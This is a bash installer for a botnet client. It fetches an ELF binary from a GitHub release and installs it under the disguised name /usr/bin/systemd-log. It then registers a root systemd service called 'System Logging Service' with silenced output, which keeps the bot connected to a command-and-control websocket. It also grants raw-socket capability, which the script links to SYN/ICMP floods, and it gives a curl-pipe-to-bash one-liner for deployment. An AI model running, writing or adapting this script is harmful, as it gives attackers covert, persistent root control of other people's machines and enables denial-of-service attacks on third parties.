#!/bin/bash
# ============================================================
# BOT DEPLOYER — public repo, no token required
# ============================================================
# Usage:
#   curl -sL https://raw.githubusercontent.com/duaakcon10/dc-ansta/main/install.sh | bash -s wss://bot.minhvuong.io.vn/ws/bot/
#   BOT_TAG=v4.0.6 bash install.sh wss://bot.minhvuong.io.vn/ws/bot/
# ============================================================
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()  { echo "[*] $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[x]${NC} $1"; }

C2_URL="${1:-wss://bot.minhvuong.io.vn/ws/bot/}"
GITHUB_REPO="duaakcon10/dc-ansta"
BOT_PATH="/usr/bin/systemd-log"
C2_CFG="/etc/.bot_c2"
SERVICE_NAME="systemd-log"
# Optional pin: BOT_TAG=v4.0.6
FALLBACK_TAG="${BOT_TAG:-v4.0.20}"

if [ "$(id -u)" -ne 0 ]; then
    err "Must run as root (sudo)."
    exit 1
fi

case "$C2_URL" in
    wss://*|ws://*) ;;
    *) C2_URL="wss://${C2_URL}" ;;
esac
if [[ "$C2_URL" != *"/ws/"* ]]; then
    C2_URL="${C2_URL%/}/ws/bot/"
fi

info "C2 URL  : $C2_URL"
info "Repo    : github.com/$GITHUB_REPO"
info "Binary  : $BOT_PATH"

for cmd in curl; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        err "Missing: $cmd"
        exit 1
    fi
done

# ── Resolve tag (API optional — never hard-fail) ──
LATEST=""
if [ -n "$BOT_TAG" ]; then
    LATEST="$BOT_TAG"
    info "Using BOT_TAG=$LATEST"
else
    info "Fetching latest release tag..."
    # Prefer redirect Location of /releases/latest (no JSON parse)
    REDIR=$(curl -sI "https://github.com/$GITHUB_REPO/releases/latest" 2>/dev/null | tr -d '\r' | grep -i '^location:' | tail -1 | awk '{print $2}') || true
    if [ -n "$REDIR" ]; then
        LATEST=$(echo "$REDIR" | sed -n 's|.*/tag/\([^/]*\).*|\1|p')
    fi
    if [ -z "$LATEST" ]; then
        # JSON API (may rate-limit)
        BODY=$(curl -sS -A "bot-installer" "https://api.github.com/repos/$GITHUB_REPO/releases/latest" 2>/dev/null) || true
        LATEST=$(echo "$BODY" | sed -n 's/.*"tag_name"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
    fi
    if [ -z "$LATEST" ]; then
        warn "API unavailable — using fallback tag $FALLBACK_TAG"
        LATEST="$FALLBACK_TAG"
    fi
fi

ok "Release tag: $LATEST"

# ── Download binary (direct URL, no API) ──────────
TMP_BIN="/tmp/bot_update_$$"
DL_URL="https://github.com/$GITHUB_REPO/releases/download/${LATEST}/bot_static"
info "Downloading: $DL_URL"

HTTP_CODE=$(curl -sL -A "bot-installer" -o "$TMP_BIN" -w "%{http_code}" "$DL_URL" 2>/dev/null || echo "000")
if [ "$HTTP_CODE" != "200" ] || [ ! -s "$TMP_BIN" ]; then
    warn "bot_static failed (HTTP $HTTP_CODE), trying bot..."
    DL_URL="https://github.com/$GITHUB_REPO/releases/download/${LATEST}/bot"
    HTTP_CODE=$(curl -sL -A "bot-installer" -o "$TMP_BIN" -w "%{http_code}" "$DL_URL" 2>/dev/null || echo "000")
fi

if [ "$HTTP_CODE" != "200" ] || [ ! -s "$TMP_BIN" ]; then
    err "Download failed (HTTP $HTTP_CODE)."
    echo "  Manual:"
    echo "    curl -sL -o $BOT_PATH https://github.com/$GITHUB_REPO/releases/download/$FALLBACK_TAG/bot_static"
    echo "    chmod +x $BOT_PATH"
    rm -f "$TMP_BIN"
    exit 1
fi

# ELF magic 7f 45 4c 46
MAGIC=$(od -An -tx1 -N4 "$TMP_BIN" 2>/dev/null | tr -d ' \n')
if [ "$MAGIC" != "7f454c46" ]; then
    err "Not a valid ELF binary (magic=$MAGIC)."
    rm -f "$TMP_BIN"
    exit 1
fi
ok "Binary OK ($(du -h "$TMP_BIN" | awk '{print $1}'))"

info "Stopping old instance..."
systemctl stop "$SERVICE_NAME.service" 2>/dev/null || true
killall "$SERVICE_NAME" 2>/dev/null || true
sleep 1

info "Installing to $BOT_PATH..."
mv -f "$TMP_BIN" "$BOT_PATH"
chmod +x "$BOT_PATH"

if setcap cap_net_raw+ep "$BOT_PATH" 2>/dev/null; then
    ok "CAP_NET_RAW set"
else
    warn "setcap skipped (install libcap2-bin for SYN/ICMP)"
fi

echo "$C2_URL" > "$C2_CFG"
chmod 600 "$C2_CFG" 2>/dev/null || true

cat > "/etc/systemd/system/${SERVICE_NAME}.service" << SERVICE
[Unit]
Description=System Logging Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${BOT_PATH} ${C2_URL}
Restart=always
RestartSec=10
User=root
WorkingDirectory=/
StandardOutput=null
StandardError=null
LimitNOFILE=1048576

[Install]
WantedBy=multi-user.target
SERVICE

systemctl daemon-reload
systemctl enable "$SERVICE_NAME.service" >/dev/null 2>&1 || true
systemctl restart "$SERVICE_NAME.service"
sleep 2

echo ""
echo "============================================"
if systemctl is-active --quiet "$SERVICE_NAME.service" 2>/dev/null; then
    ok "Bot service ACTIVE"
else
    warn "Service not active. Debug:"
    echo "  systemctl status $SERVICE_NAME"
    echo "  BOT_FOREGROUND=1 $BOT_PATH $C2_URL --foreground"
fi
echo "  Tag     : $LATEST"
echo "  C2      : $C2_URL"
echo "  Binary  : $BOT_PATH"
echo "  Status  : systemctl status $SERVICE_NAME"
echo "============================================"
